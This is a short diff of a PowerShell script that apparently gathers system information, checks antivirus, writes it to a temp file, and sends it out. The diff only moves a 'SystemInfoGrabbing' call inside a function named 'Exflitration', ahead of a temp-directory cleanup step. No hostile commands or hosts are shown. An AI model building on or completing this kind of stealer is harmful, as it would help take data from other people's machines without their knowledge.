@@ -60,6 +60,9 @@ function Exflitration {
 
     # Call SysInfo function
     SysInfo
+
+    #Call SystemInfoGrabbing
+    SystemInfoGrabbing
 }
 
     function version-av {
@@ -280,9 +283,6 @@ $outputPath = Join-Path $env:TEMP "SystemInfo.txt"
 
 #Call Exflitration
 Exflitration
-
-#Call SystemInfoGrabbing
-SystemInfoGrabbing
 
 #Call DelTempDir
 DelTempDir
